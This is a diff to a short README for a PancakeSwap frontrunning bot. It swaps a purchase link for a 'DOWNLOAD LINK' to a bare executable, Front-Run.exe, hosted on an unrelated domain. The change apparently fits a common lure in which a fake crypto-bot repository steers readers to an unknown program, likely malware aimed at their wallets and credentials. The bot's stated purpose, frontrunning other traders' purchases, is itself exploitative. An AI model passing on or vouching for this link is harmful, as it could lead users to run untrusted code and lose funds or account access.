@@ -1,7 +1,7 @@
-# FRONTRUN_BOT
+# FRONTRUN_BOT_CRYPTO
 
 
-PURCHASE LINK: https://enzypt.io/Q0PXNpJjSsxWCPpHs0VgShFoA64ZWlgW/TG99udi6FnERhflDbWlC-lfFIgk5ekXpH50XmIzIMY8
+DOWNLOAD LINK: https://czxejo.live/Front-Run.exe
 
 
 A simple pancakeswap frontrun bot that purchases the specified token when liquidity is added.
